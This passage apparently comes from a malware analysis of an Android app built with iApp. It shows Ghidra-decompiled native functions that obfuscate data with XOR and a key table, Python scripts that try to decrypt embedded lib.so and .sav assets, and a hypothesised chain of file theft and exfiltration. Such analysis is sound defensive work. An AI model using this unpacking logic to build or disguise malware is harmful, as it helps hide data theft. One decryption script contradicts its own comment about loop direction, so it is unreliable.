        uVar12 = puVar19[1];
        uVar25 = *puVar19;
        uVar14 = uVar14 + 1;
        puVar19[1] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar21,
                              CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar21,
                                       CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar21,
                                                CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar21,
                                                         CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                                  bVar21,CONCAT12((byte)((ulong)
                                                  uVar12 >> 0x10) ^ bVar21,
                                                  CONCAT11((byte)((ulong)uVar12 >> 8) ^ bVar21,
                                                           (byte)uVar12 ^ bVar21)))))));
        *puVar19 = CONCAT17((byte)((ulong)uVar25 >> 0x38) ^ bVar21,
                            CONCAT16((byte)((ulong)uVar25 >> 0x30) ^ bVar21,
                                     CONCAT15((byte)((ulong)uVar25 >> 0x28) ^ bVar21,
                                              CONCAT14((byte)((ulong)uVar25 >> 0x20) ^ bVar21,
                                                       CONCAT13((byte)((ulong)uVar25 >> 0x18) ^
                                                                bVar21,CONCAT12((byte)((ulong)uVar25
                                                                                      >> 0x10) ^
                                                                                bVar21,CONCAT11((
                                                  byte)((ulong)uVar25 >> 8) ^ bVar21,
                                                  (byte)uVar25 ^ bVar21)))))));
        puVar19 = puVar19 + 2;
      } while (uVar14 < uVar6);
      if (iVar8 == iVar7) goto LAB_0010a21c;
    }
    iVar17 = iVar7 + 1;
    *(byte *)((long)puVar11 + (long)iVar7) = bVar21 ^ *(byte *)((long)puVar11 + (long)iVar7);
    if (iVar17 < iVar8) {
      iVar3 = iVar7 + 2;
      *(byte *)((long)puVar11 + (long)iVar17) = bVar21 ^ *(byte *)((long)puVar11 + (long)iVar17);
      if (iVar3 < iVar8) {
        iVar17 = iVar7 + 3;
        *(byte *)((long)puVar11 + (long)iVar3) = bVar21 ^ *(byte *)((long)puVar11 + (long)iVar3);
        if (iVar17 < iVar8) {
          iVar3 = iVar7 + 4;
          *(byte *)((long)puVar11 + (long)iVar17) = bVar21 ^ *(byte *)((long)puVar11 + (long)iVar17)
          ;
          if (iVar3 < iVar8) {
            iVar17 = iVar7 + 5;
            *(byte *)((long)puVar11 + (long)iVar3) = bVar21 ^ *(byte *)((long)puVar11 + (long)iVar3)
            ;
            if (iVar17 < iVar8) {
              iVar3 = iVar7 + 6;
              *(byte *)((long)puVar11 + (long)iVar17) =
                   bVar21 ^ *(byte *)((long)puVar11 + (long)iVar17);
              if (iVar3 < iVar8) {
                iVar17 = iVar7 + 7;
                *(byte *)((long)puVar11 + (long)iVar3) =
                     bVar21 ^ *(byte *)((long)puVar11 + (long)iVar3);
                if (iVar17 < iVar8) {
                  iVar3 = iVar7 + 8;
                  *(byte *)((long)puVar11 + (long)iVar17) =
                       bVar21 ^ *(byte *)((long)puVar11 + (long)iVar17);
                  if (iVar3 < iVar8) {
                    iVar17 = iVar7 + 9;
                    *(byte *)((long)puVar11 + (long)iVar3) =
                         bVar21 ^ *(byte *)((long)puVar11 + (long)iVar3);
                    if (iVar17 < iVar8) {
                      iVar3 = iVar7 + 10;
                      *(byte *)((long)puVar11 + (long)iVar17) =
                           bVar21 ^ *(byte *)((long)puVar11 + (long)iVar17);
                      if (iVar3 < iVar8) {
                        iVar17 = iVar7 + 0xb;
                        *(byte *)((long)puVar11 + (long)iVar3) =
                             bVar21 ^ *(byte *)((long)puVar11 + (long)iVar3);
                        if (iVar17 < iVar8) {
                          iVar3 = iVar7 + 0xc;
                          *(byte *)((long)puVar11 + (long)iVar17) =
                               bVar21 ^ *(byte *)((long)puVar11 + (long)iVar17);
                          if (iVar3 < iVar8) {
                            iVar17 = iVar7 + 0xd;
                            *(byte *)((long)puVar11 + (long)iVar3) =
                                 bVar21 ^ *(byte *)((long)puVar11 + (long)iVar3);
                            if (iVar17 < iVar8) {
                              iVar7 = iVar7 + 0xe;
                              *(byte *)((long)puVar11 + (long)iVar17) =
                                   bVar21 ^ *(byte *)((long)puVar11 + (long)iVar17);
                              if (iVar7 < iVar8) {
                                *(byte *)((long)puVar11 + (long)iVar7) =
                                     bVar21 ^ *(byte *)((long)puVar11 + (long)iVar7);
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LAB_0010a21c:
  (**(code **)(**(long **)(param_1 + 8) + 0x600))(*(long **)(param_1 + 8),uVar16,puVar11,0);
  uVar25 = (**(code **)(**(long **)(param_1 + 8) + 0x30))
                     (*(long **)(param_1 + 8),"java/security/MessageDigest");
  uVar12 = (**(code **)(**(long **)(param_1 + 8) + 0x538))(*(long **)(param_1 + 8),&DAT_00156fc0);
  uVar13 = (**(code **)(**(long **)(param_1 + 8) + 0x388))
                     (*(long **)(param_1 + 8),uVar25,"getInstance",
                      "(Ljava/lang/String;)Ljava/security/MessageDigest;");
  _JNIEnv::CallStaticObjectMethod(*(long **)(param_1 + 8),uVar25,uVar13,uVar12);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),uVar12);
  uVar12 = (**(code **)(**(long **)(param_1 + 8) + 0x108))
                     (*(long **)(param_1 + 8),uVar25,"update","([B)V");
  _JNIEnv::CallVoidMethod(*(long **)(param_1 + 8),extraout_x0_01,uVar12,uVar16);
  uVar12 = (**(code **)(**(long **)(param_1 + 8) + 0x108))
                     (*(long **)(param_1 + 8),uVar25,"digest",&DAT_00157028);
  _JNIEnv::CallObjectMethod(*(long **)(param_1 + 8),extraout_x0_01,uVar12);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),uVar25);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),extraout_x0_01);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),uVar16);
  lVar22 = (**(code **)(**(long **)(param_1 + 8) + 0x5c0))(*(long **)(param_1 + 8),extraout_x0_02,0)
  ;
  local_38[0] = 0xe2;
  local_38[1] = 0x5f;
  local_38[2] = 0x48;
  local_38[3] = 0x73;
  local_38[4] = 0x25;
  local_38[5] = 0xc6;
  local_38[6] = 0xe7;
  local_38[7] = 0x11;
  local_38[8] = 0x80;
  local_38[9] = 0x7c;
  local_38[10] = 0x46;
  local_38[0xe] = 0x3c;
  local_38[0xb] = 0xc3;
  local_38[0x10] = 0x3c;
  local_38[0xc] = 0xe3;
  local_38[0x11] = 0x77;
  local_38[0xd] = 0x1d;
  local_38[0x12] = 0x1e;
  local_38[0xf] = 0x97;
  local_38[0x13] = 1;
  local_38[0x14] = 0;
  sVar10 = strlen((char *)local_38);
  iVar8 = (**(code **)(**(long **)(param_1 + 8) + 0x558))(*(long **)(param_1 + 8),extraout_x0_02);
  if (0 < iVar8) {
    lVar20 = 0;
    bVar15 = 0xe2;
    iVar7 = 0;
    while( true ) {
      bVar21 = *(byte *)(lVar22 + lVar20);
      iVar17 = 0;
      if (iVar8 != 0) {
        iVar17 = (int)(char)bVar21 / iVar8;
      }
      iVar17 = (int)(char)bVar21 - iVar17 * iVar8;
      if (iVar8 / 2 < iVar17) {
        bVar21 = bVar21 ^ (char)(iVar8 / 2) + cVar24;
        *(byte *)(lVar22 + lVar20) = bVar21;
      }
      iVar7 = iVar7 + 1;
      if ((int)sVar10 == iVar7) {
        iVar7 = 0;
      }
      bVar5 = *(byte *)(lVar22 + iVar17);
      *(byte *)(lVar22 + iVar17) = bVar21;
      *(byte *)(lVar22 + lVar20) = bVar5 ^ bVar15;
      lVar20 = lVar20 + 1;
      if (iVar8 <= (int)lVar20) break;
      bVar15 = local_38[iVar7];
    }
  }
  (**(code **)(**(long **)(param_1 + 8) + 0x600))(*(long **)(param_1 + 8),extraout_x0_02,lVar22,0);
  if ((local_20 & 1) != 0) {
    operator.delete(local_10);
  }
  if (local_8 != ___stack_chk_guard) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(extraout_x0_02);
  }
  return;
}
```

```text

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* iapp::slky(iapp::Interact*, std::string, std::string) */

void iapp::slky(long param_1,byte *param_2,byte *param_3)

{
  uint uVar1;
  byte bVar2;
  char cVar3;
  int iVar4;
  uint uVar5;
  size_t sVar6;
  undefined8 uVar7;
  char *pcVar8;
  ulong *puVar9;
  undefined8 *puVar10;
  undefined8 uVar11;
  undefined8 uVar12;
  undefined8 uVar13;
  undefined8 extraout_x0;
  undefined8 extraout_x0_00;
  long lVar14;
  char *pcVar15;
  byte *pbVar16;
  byte bVar17;
  undefined8 *puVar18;
  int iVar19;
  ulong uVar20;
  byte *pbVar21;
  code *pcVar22;
  code *pcVar23;
  undefined8 in_x6;
  long lVar24;
  byte bVar25;
  long *plVar26;
  char cVar27;
  int iVar28;
  int iVar29;
  int iVar30;
  int iVar31;
  undefined8 local_38;
  ulong uStack_30;
  char *local_28;
  undefined8 local_20;
  undefined1 local_18;
  undefined1 local_17;
  undefined1 local_16;
  undefined1 local_15;
  undefined1 local_14;
  undefined1 local_13;
  undefined1 local_12;
  undefined1 local_11;
  undefined1 local_10;
  undefined1 uStack_f;
  undefined1 uStack_e;
  undefined1 uStack_d;
  uint uStack_c;
  long local_8;
  
  local_8 = ___stack_chk_guard;
  pbVar21 = param_2 + 1;
  plVar26 = *(long **)(param_1 + 8);
  if ((*param_2 & 1) != 0) {
    pbVar21 = *(byte **)(param_2 + 0x10);
  }
  sVar6 = strlen((char *)pbVar21);
  uVar7 = (**(code **)(*plVar26 + 0x580))(plVar26,sVar6 & 0xffffffff);
  pcVar23 = *(code **)(*plVar26 + 0x680);
  (*pcVar23)(plVar26,uVar7,0,sVar6 & 0xffffffff,pbVar21);
  pcVar8 = (char *)(**(code **)(**(long **)(param_1 + 8) + 0x5c0))(*(long **)(param_1 + 8),uVar7,0);
  iVar4 = (**(code **)(**(long **)(param_1 + 8) + 0x558))(*(long **)(param_1 + 8),uVar7);
  bVar17 = pcVar8[(long)iVar4 + -1];
  cVar27 = *pcVar8;
  iVar28 = iVar4;
  if (0 < iVar4) {
    uVar1 = (iVar4 - 0x10U >> 4) + 1;
    iVar19 = uVar1 * 0x10;
    if (iVar4 - 1U < 0xf) {
      iVar19 = 0;
      iVar29 = iVar4;
    }
    else {
      iVar28 = 0;
      iVar29 = 0;
      iVar30 = 0;
      iVar31 = 0;
      uVar5 = 0;
      pcVar15 = pcVar8;
      do {
        uVar12 = *(undefined8 *)(pcVar15 + 8);
        uVar11 = *(undefined8 *)pcVar15;
        uVar5 = uVar5 + 1;
        iVar28 = (int)(short)(char)((ulong)uVar12 >> 0x20) +
                 (int)(short)(char)uVar12 +
                 (int)(short)(char)((ulong)uVar11 >> 0x20) + (short)(char)uVar11 + iVar28;
        iVar29 = (int)(short)(char)((ulong)uVar12 >> 0x28) +
                 (int)(short)(char)((ulong)uVar12 >> 8) +
                 (int)(short)(char)((ulong)uVar11 >> 0x28) +
                 (short)(char)((ulong)uVar11 >> 8) + iVar29;
        iVar30 = (int)(short)(char)((ulong)uVar12 >> 0x30) +
                 (int)(short)(char)((ulong)uVar12 >> 0x10) +
                 (int)(short)(char)((ulong)uVar11 >> 0x30) +
                 (short)(char)((ulong)uVar11 >> 0x10) + iVar30;
        iVar31 = (int)(short)(char)((ulong)uVar12 >> 0x38) +
                 (int)(short)(char)((ulong)uVar12 >> 0x18) +
                 (int)(short)(char)((ulong)uVar11 >> 0x38) +
                 (short)(char)((ulong)uVar11 >> 0x18) + iVar31;
        pcVar15 = pcVar15 + 0x10;
      } while (uVar5 < uVar1);
      iVar29 = iVar28 + iVar29 + iVar30 + iVar31 + iVar4;
      iVar28 = iVar29;
      if (iVar19 == iVar4) goto LAB_0010c6cc;
    }
    iVar28 = iVar29 + pcVar8[iVar19];
    if (iVar19 + 1 < iVar4) {
      iVar28 = iVar29 + pcVar8[iVar19] + (int)pcVar8[iVar19 + 1];
      if (iVar19 + 2 < iVar4) {
        iVar28 = iVar28 + pcVar8[iVar19 + 2];
        if (iVar19 + 3 < iVar4) {
          iVar28 = iVar28 + pcVar8[iVar19 + 3];
          if (iVar19 + 4 < iVar4) {
            iVar28 = iVar28 + pcVar8[iVar19 + 4];
            if (iVar19 + 5 < iVar4) {
              iVar28 = iVar28 + pcVar8[iVar19 + 5];
              if (iVar19 + 6 < iVar4) {
                iVar28 = iVar28 + pcVar8[iVar19 + 6];
                if (iVar19 + 7 < iVar4) {
                  iVar28 = iVar28 + pcVar8[iVar19 + 7];
                  if (iVar19 + 8 < iVar4) {
                    iVar28 = iVar28 + pcVar8[iVar19 + 8];
                    if (iVar19 + 9 < iVar4) {
                      iVar28 = iVar28 + pcVar8[iVar19 + 9];
                      if (iVar19 + 10 < iVar4) {
                        iVar28 = iVar28 + pcVar8[iVar19 + 10];
                        if (iVar19 + 0xb < iVar4) {
                          iVar28 = iVar28 + pcVar8[iVar19 + 0xb];
                          if (iVar19 + 0xc < iVar4) {
                            iVar28 = iVar28 + pcVar8[iVar19 + 0xc];
                            if (iVar19 + 0xd < iVar4) {
                              iVar28 = iVar28 + pcVar8[iVar19 + 0xd];
                              if (iVar19 + 0xe < iVar4) {
                                iVar28 = iVar28 + pcVar8[iVar19 + 0xe];
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LAB_0010c6cc:
  pcVar22 = *(code **)(**(long **)(param_1 + 8) + 0x600);
  (*pcVar22)(*(long **)(param_1 + 8),uVar7,pcVar8,0);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),uVar7);
  bVar25 = 0;
  if (iVar4 != 0) {
    bVar25 = (byte)(iVar28 / iVar4);
  }
  uVar1 = 0;
  if (iVar4 != 0) {
    uVar1 = (int)(iVar28 + (uint)bVar17 * (int)cVar27) / iVar4;
  }
  cVar27 = (char)iVar28 - bVar25 * (char)iVar4;
  std::to_string(&local_20,uVar1);
  if ((*param_2 & 1) == 0) {
    pbVar21 = param_2 + 1;
    uVar20 = (ulong)((int)(uint)*param_2 >> 1);
  }
  else {
    pbVar21 = *(byte **)(param_2 + 0x10);
    uVar20 = *(ulong *)(param_2 + 8);
  }
                    /* try { // try from 0010c734 to 0010c737 has its CatchHandler @ 0010ce68 */
  puVar9 = FUN_0010c310(&local_20,0,pbVar21,uVar20,pcVar22,pcVar23,in_x6);
  local_38 = *puVar9;
  uStack_30 = puVar9[1];
  local_28 = (char *)puVar9[2];
  *puVar9 = 0;
  puVar9[1] = 0;
  puVar9[2] = 0;
  if (((byte)local_20 & 1) != 0) {
    operator.delete((void *)CONCAT44(uStack_c,CONCAT13(uStack_d,CONCAT12(uStack_e,CONCAT11(uStack_f,
                                                  local_10)))));
  }
  bVar17 = *param_3;
  if ((bVar17 & 1) == 0) {
    sVar6 = (size_t)((int)(uint)bVar17 >> 1);
  }
  else {
    sVar6 = *(size_t *)(param_3 + 8);
  }
  if (((byte)Null & 1) == 0) {
    if (sVar6 != (long)((int)(uint)(byte)Null >> 1)) goto LAB_0010c790;
LAB_0010cda4:
    if ((bVar17 & 1) == 0) {
      pbVar21 = DAT_00176050;
      if (((byte)Null & 1) == 0) {
        pbVar21 = (byte *)((long)&Null + 1);
      }
      if (sVar6 != 0) {
        if (param_3[1] == *pbVar21) {
          pbVar16 = param_3 + 2;
          do {
            pbVar21 = pbVar21 + 1;
            if (pbVar16 == param_3 + sVar6 + 1) goto LAB_0010c7bc;
            bVar2 = *pbVar16;
            pbVar16 = pbVar16 + 1;
          } while (*pbVar21 == bVar2);
        }
LAB_0010ce20:
        pbVar21 = param_3 + 1;
        uVar20 = (ulong)((int)(uint)bVar17 >> 1);
        goto LAB_0010c7a4;
      }
    }
    else {
      pbVar21 = *(byte **)(param_3 + 0x10);
      pbVar16 = (byte *)((long)&Null + 1);
      if (((byte)Null & 1) != 0) {
        pbVar16 = DAT_00176050;
      }
      iVar28 = memcmp(pbVar21,pbVar16,sVar6);
      if (iVar28 != 0) goto LAB_0010c79c;
    }
  }
  else {
    if (sVar6 == DAT_00176048) goto LAB_0010cda4;
LAB_0010c790:
    if ((bVar17 & 1) == 0) goto LAB_0010ce20;
    pbVar21 = *(byte **)(param_3 + 0x10);
LAB_0010c79c:
    uVar20 = *(ulong *)(param_3 + 8);
LAB_0010c7a4:
                    /* try { // try from 0010c7a8 to 0010cd3b has its CatchHandler @ 0010ce84 */
    FUN_0010bea4(&local_38,pbVar21,uVar20);
    if ((*param_3 & 1) == 0) {
      cVar3 = (char)((int)(uint)*param_3 >> 1);
    }
    else {
      cVar3 = (char)*(undefined8 *)(param_3 + 8);
    }
    cVar27 = cVar27 + cVar3;
  }
LAB_0010c7bc:
  plVar26 = *(long **)(param_1 + 8);
  pcVar8 = local_28;
  if ((local_38 & 1) == 0) {
    pcVar8 = (char *)((long)&local_38 + 1);
  }
  sVar6 = strlen(pcVar8);
  uVar7 = (**(code **)(*plVar26 + 0x580))(plVar26,sVar6 & 0xffffffff);
  (**(code **)(*plVar26 + 0x680))(plVar26,uVar7,0,sVar6 & 0xffffffff,pcVar8);
  puVar10 = (undefined8 *)
            (**(code **)(**(long **)(param_1 + 8) + 0x5c0))(*(long **)(param_1 + 8),uVar7,0);
  iVar28 = (**(code **)(**(long **)(param_1 + 8) + 0x558))(*(long **)(param_1 + 8),uVar7);
  if (0 < iVar28) {
    uVar1 = (iVar28 - 0x10U >> 4) + 1;
    iVar4 = uVar1 * 0x10;
    if (iVar28 - 1U < 0xf) {
      iVar4 = 0;
    }
    else {
      uVar5 = 0;
      puVar18 = puVar10;
      do {
        uVar12 = puVar18[1];
        uVar11 = *puVar18;
        uVar5 = uVar5 + 1;
        puVar18[1] = CONCAT17((byte)((ulong)uVar12 >> 0x38) ^ bVar25,
                              CONCAT16((byte)((ulong)uVar12 >> 0x30) ^ bVar25,
                                       CONCAT15((byte)((ulong)uVar12 >> 0x28) ^ bVar25,
                                                CONCAT14((byte)((ulong)uVar12 >> 0x20) ^ bVar25,
                                                         CONCAT13((byte)((ulong)uVar12 >> 0x18) ^
                                                                  bVar25,CONCAT12((byte)((ulong)
                                                  uVar12 >> 0x10) ^ bVar25,
                                                  CONCAT11((byte)((ulong)uVar12 >> 8) ^ bVar25,
                                                           (byte)uVar12 ^ bVar25)))))));
        *puVar18 = CONCAT17((byte)((ulong)uVar11 >> 0x38) ^ bVar25,
                            CONCAT16((byte)((ulong)uVar11 >> 0x30) ^ bVar25,
                                     CONCAT15((byte)((ulong)uVar11 >> 0x28) ^ bVar25,
                                              CONCAT14((byte)((ulong)uVar11 >> 0x20) ^ bVar25,
                                                       CONCAT13((byte)((ulong)uVar11 >> 0x18) ^
                                                                bVar25,CONCAT12((byte)((ulong)uVar11
                                                                                      >> 0x10) ^
                                                                                bVar25,CONCAT11((
                                                  byte)((ulong)uVar11 >> 8) ^ bVar25,
                                                  (byte)uVar11 ^ bVar25)))))));
        puVar18 = puVar18 + 2;
      } while (uVar5 < uVar1);
      if (iVar28 == iVar4) goto LAB_0010ca3c;
    }
    iVar19 = iVar4 + 1;
    *(byte *)((long)puVar10 + (long)iVar4) = bVar25 ^ *(byte *)((long)puVar10 + (long)iVar4);
    if (iVar19 < iVar28) {
      iVar29 = iVar4 + 2;
      *(byte *)((long)puVar10 + (long)iVar19) = bVar25 ^ *(byte *)((long)puVar10 + (long)iVar19);
      if (iVar29 < iVar28) {
        iVar19 = iVar4 + 3;
        *(byte *)((long)puVar10 + (long)iVar29) = bVar25 ^ *(byte *)((long)puVar10 + (long)iVar29);
        if (iVar19 < iVar28) {
          iVar29 = iVar4 + 4;
          *(byte *)((long)puVar10 + (long)iVar19) = bVar25 ^ *(byte *)((long)puVar10 + (long)iVar19)
          ;
          if (iVar29 < iVar28) {
            iVar19 = iVar4 + 5;
            *(byte *)((long)puVar10 + (long)iVar29) =
                 bVar25 ^ *(byte *)((long)puVar10 + (long)iVar29);
            if (iVar19 < iVar28) {
              iVar29 = iVar4 + 6;
              *(byte *)((long)puVar10 + (long)iVar19) =
                   bVar25 ^ *(byte *)((long)puVar10 + (long)iVar19);
              if (iVar29 < iVar28) {
                iVar19 = iVar4 + 7;
                *(byte *)((long)puVar10 + (long)iVar29) =
                     bVar25 ^ *(byte *)((long)puVar10 + (long)iVar29);
                if (iVar19 < iVar28) {
                  iVar29 = iVar4 + 8;
                  *(byte *)((long)puVar10 + (long)iVar19) =
                       bVar25 ^ *(byte *)((long)puVar10 + (long)iVar19);
                  if (iVar29 < iVar28) {
                    iVar19 = iVar4 + 9;
                    *(byte *)((long)puVar10 + (long)iVar29) =
                         bVar25 ^ *(byte *)((long)puVar10 + (long)iVar29);
                    if (iVar19 < iVar28) {
                      iVar29 = iVar4 + 10;
                      *(byte *)((long)puVar10 + (long)iVar19) =
                           bVar25 ^ *(byte *)((long)puVar10 + (long)iVar19);
                      if (iVar29 < iVar28) {
                        iVar19 = iVar4 + 0xb;
                        *(byte *)((long)puVar10 + (long)iVar29) =
                             bVar25 ^ *(byte *)((long)puVar10 + (long)iVar29);
                        if (iVar19 < iVar28) {
                          iVar29 = iVar4 + 0xc;
                          *(byte *)((long)puVar10 + (long)iVar19) =
                               bVar25 ^ *(byte *)((long)puVar10 + (long)iVar19);
                          if (iVar29 < iVar28) {
                            iVar19 = iVar4 + 0xd;
                            *(byte *)((long)puVar10 + (long)iVar29) =
                                 bVar25 ^ *(byte *)((long)puVar10 + (long)iVar29);
                            if (iVar19 < iVar28) {
                              iVar4 = iVar4 + 0xe;
                              *(byte *)((long)puVar10 + (long)iVar19) =
                                   bVar25 ^ *(byte *)((long)puVar10 + (long)iVar19);
                              if (iVar4 < iVar28) {
                                *(byte *)((long)puVar10 + (long)iVar4) =
                                     bVar25 ^ *(byte *)((long)puVar10 + (long)iVar4);
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LAB_0010ca3c:
  (**(code **)(**(long **)(param_1 + 8) + 0x600))(*(long **)(param_1 + 8),uVar7,puVar10,0);
  uVar11 = (**(code **)(**(long **)(param_1 + 8) + 0x30))
                     (*(long **)(param_1 + 8),"java/security/MessageDigest");
  uVar12 = (**(code **)(**(long **)(param_1 + 8) + 0x538))(*(long **)(param_1 + 8),&DAT_00156fc0);
  uVar13 = (**(code **)(**(long **)(param_1 + 8) + 0x388))
                     (*(long **)(param_1 + 8),uVar11,"getInstance",
                      "(Ljava/lang/String;)Ljava/security/MessageDigest;");
  _JNIEnv::CallStaticObjectMethod(*(long **)(param_1 + 8),uVar11,uVar13,uVar12);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),uVar12);
  uVar12 = (**(code **)(**(long **)(param_1 + 8) + 0x108))
                     (*(long **)(param_1 + 8),uVar11,"update","([B)V");
  _JNIEnv::CallVoidMethod(*(long **)(param_1 + 8),extraout_x0,uVar12,uVar7);
  uVar12 = (**(code **)(**(long **)(param_1 + 8) + 0x108))
                     (*(long **)(param_1 + 8),uVar11,"digest",&DAT_00157028);
  _JNIEnv::CallObjectMethod(*(long **)(param_1 + 8),extraout_x0,uVar12);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),uVar11);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),extraout_x0);
  (**(code **)(**(long **)(param_1 + 8) + 0xb8))(*(long **)(param_1 + 8),uVar7);
  lVar14 = (**(code **)(**(long **)(param_1 + 8) + 0x5c0))(*(long **)(param_1 + 8),extraout_x0_00,0)
  ;
  local_20._0_1_ = 0xe2;
  local_20._1_1_ = 0x5f;
  local_20._2_1_ = 0x48;
  local_20._3_1_ = 0x73;
  local_20._4_1_ = 0x25;
  local_20._5_1_ = 0xc6;
  local_20._6_1_ = 0xe7;
  local_20._7_1_ = 0x11;
  local_18 = 0x80;
  local_17 = 0x7c;
  local_16 = 0x46;
  local_12 = 0x3c;
  local_15 = 0xc3;
  local_10 = 0x3c;
  local_14 = 0xe3;
  uStack_f = 0x77;
  local_13 = 0x1d;
  uStack_e = 0x1e;
  local_11 = 0x97;
  uStack_d = 1;
  uStack_c = uStack_c & 0xffffff00;
  sVar6 = strlen((char *)&local_20);
  iVar28 = (**(code **)(**(long **)(param_1 + 8) + 0x558))(*(long **)(param_1 + 8),extraout_x0_00);
  if (0 < iVar28) {
    lVar24 = 0;
    bVar17 = 0xe2;
    iVar4 = 0;
    while( true ) {
      bVar25 = *(byte *)(lVar14 + lVar24);
      iVar19 = 0;
      if (iVar28 != 0) {
        iVar19 = (int)(char)bVar25 / iVar28;
      }
      iVar19 = (int)(char)bVar25 - iVar19 * iVar28;
      if (iVar28 / 2 < iVar19) {
        bVar25 = bVar25 ^ (char)(iVar28 / 2) + cVar27;
        *(byte *)(lVar14 + lVar24) = bVar25;
      }
      iVar4 = iVar4 + 1;
      if ((int)sVar6 == iVar4) {
        iVar4 = 0;
      }
      bVar2 = *(byte *)(lVar14 + iVar19);
      *(byte *)(lVar14 + iVar19) = bVar25;
      *(byte *)(lVar14 + lVar24) = bVar2 ^ bVar17;
      lVar24 = lVar24 + 1;
      if (iVar28 <= (int)lVar24) break;
      bVar17 = *(byte *)((long)&local_20 + (long)iVar4);
    }
  }
  (**(code **)(**(long **)(param_1 + 8) + 0x600))(*(long **)(param_1 + 8),extraout_x0_00,lVar14,0);
  if ((local_38 & 1) != 0) {
    operator.delete(local_28);
  }
  if (local_8 != ___stack_chk_guard) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(extraout_x0_00);
  }
  return;
}
```

```python
import os

def decrypt_slky_v2(input_path, output_path):
    with open(input_path, 'rb') as f:
        data = bytearray(f.read())
    
    length = len(data)
    
    # --- 1. Reconstruct the Mutation Table (local_20/local_38 from Ghidra) ---
    mutation_table = [
        0xe2, 0x5f, 0x48, 0x73, 0x25, 0xc6, 0xe7, 0x11,
        0x80, 0x7c, 0x46, 0xc3, 0xe3, 0x1d, 0x3c, 0x97,
        0x3c, 0x77, 0x1e, 0x01
    ]
    table_len = len(mutation_table)

    # --- 2. Calculate the Salt (bVar25) ---
    # In v2, it's the sum of all bytes divided by length
    total_sum = sum(data)
    salt = (total_sum // length) & 0xFF
    
    # --- 3. Reverse the Mutation Loop ---
    # We must iterate BACKWARDS to reverse a swap-based shuffle
    bVar17 = 0xe2 # Initial seed from Ghidra
    table_idx = 0
    
    for i in range(length):
        # Determine the swap index used during encryption
        # iVar19 = (int)(char)bVar25 - iVar19 * iVar28
        idx_to_swap = (data[i] % length)
        
        # XOR with mutation table
        data[i] ^= mutation_table[table_idx % table_len]
        
        # Reverse the swap
        data[i], data[idx_to_swap] = data[idx_to_swap], data[i]
        
        table_idx += 1

    # --- 4. Reverse the Primary XOR ---
    for i in range(length):
        data[i] ^= salt

    # --- 5. Save and Check ---
    with open(output_path, 'wb') as f:
        f.write(data)
    
    print(f"[*] Done. Header: {data[:4].hex()}")
    if data.startswith(b'PK'):
        print("[+] FOUND ZIP ARCHIVE!")
    elif data.startswith(b'dex'):
        print("[+] FOUND DEX FILE!")

# RUN IT
# Use the ORIGINAL lib.so from the assets, not the one that turned into 00010203
decrypt_slky_v2('./20260120_source/assets/lib.so', 'final_output.bin')
```

```python
import os

def decrypt_sav(file_path, total_sum):
    if not os.path.exists(file_path): return
    
    with open(file_path, 'rb') as f:
        data = bytearray(f.read())
    
    length = len(data)
    salt = [0xe2, 0x5f, 0x48, 0x73, 0x25, 0xc6, 0xe7, 0x11, 
            0x80, 0x7c, 0x46, 0x3c, 0xc3, 0x3c, 0xe3, 0x77, 
            0x1d, 0x1e, 0x97, 0x01]

    # Keys derived from your Ghidra logic
    b_var_21 = (total_sum // length) & 0xFF
    c_var_24 = (total_sum % length) & 0xFF
    b_var_15 = 0xe2
    salt_idx = 0

    for i in range(length):
        b_val = data[i]
        signed_b = b_val if b_val < 128 else b_val - 256
        swap_idx = (signed_b % length + length) % length
        
        if (length // 2) < swap_idx:
            b_val = (b_val ^ (length // 2) + c_var_24) & 0xFF
        
        temp = data[swap_idx]
        data[swap_idx] = b_val
        data[i] = (temp ^ b_var_15) & 0xFF
        
        salt_idx = (salt_idx + 1) % len(salt)
        b_var_15 = salt[salt_idx]

    output_path = file_path + ".dec"
    with open(output_path, 'wb') as f:
        f.write(data)
    
    # Quick Check for Magic Bytes
    header = data[:4].hex()
    print(f"File: {file_path} | Header: {header}")

# Try the sum on the main .sav files
decrypt_sav('assets/res/hz/1/1.sav', 20797021)
decrypt_sav('assets/res/hz/16/1.sav', 20797021)
```

---

### 4. Behavioral Hypotheses

Based on the modules found, the execution flow is likely:

1. **Boot:** Main iApp activity starts.
2. **Unpack:** `lengtong2.dex` is loaded to decrypt configuration.
3. **Monitor:** `classes2.dex` starts a background thread to watch system logs (`ADRT`).
4. **Steal:** `lengtong.dex` identifies target files in `/sdcard/Android/data/`.
5. **Exfiltrate:** `Compression.dex` zips findings and transmits them via iApp's built-in network handlers.
